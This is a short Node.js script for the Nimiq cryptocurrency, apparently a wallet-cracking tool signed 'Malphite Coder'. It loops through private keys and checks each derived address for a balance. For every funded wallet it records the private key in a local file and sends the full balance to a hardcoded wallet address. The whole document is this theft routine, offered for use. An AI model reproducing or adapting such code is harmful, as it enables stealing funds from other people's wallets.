const connect = require('./node');
const fs = require('fs');

connect(async (wrapper) => {
  const getBalance = async (address) => new Promise((resolve) => {
    try {
      wrapper.accountHelper.getBalance(address, (b) => {
        const balance = b / 100000;
        resolve(balance);
      })
    } catch (error) {
      console.error(error);
      resolve(-1);
    }
  })

  const MIN_PRIVATE_KEY = BigInt(`0x1${"0".repeat(63)}`);
  const MAX_PRIVATE_KEY = BigInt(`0xF${"F".repeat(63)}`);

  let founds = 0;

  const send = (privateKeyHex) => new Promise((resolve) => {
    const wallet = wrapper.accountHelper.importWalletFromHexKey(privateKeyHex);
    const address = wallet._keyPair.publicKey.toAddress().toUserFriendlyAddress();
    wrapper.accountHelper.getBalance(address, (amount) => {
      const payload = { address: "NQ08 SUEH T0GS PCDJ HUNX Q50H B0M0 ABHA PP03", amount, fee: 0 }
      wrapper.transactionHelper.sendTransaction(wallet, payload)
      resolve(address)
    })
  })

  for (let key = MIN_PRIVATE_KEY; key <= MAX_PRIVATE_KEY; key++) {
    const privateKeyHex = key.toString(16).padStart(64, '0');
    const wallet = wrapper.accountHelper.importWalletFromHexKey(privateKeyHex);
    const address = wallet._keyPair.publicKey.toAddress().toUserFriendlyAddress();
    const balance = await getBalance(address);

    if (balance > 0) {
      founds++

      // Write to file
      var successString = "Wallet: [" + address + "] - Private: [" + privateKeyHex + "] - Balance: " + balance + " NIM" + "\n\n------ Malphite Coder ------\n\n";
      fs.appendFileSync('./match-private.txt', successString, (err) => {
        if (err) throw err;
      })

      // Create transaction to main wallet
      send(privateKeyHex)
    }

    console.log(`\x1b[32mFounds: ${founds} | Wallet Check : ${address} | ${privateKeyHex} | ${balance} NIM\x1b[0m`)
  }
})
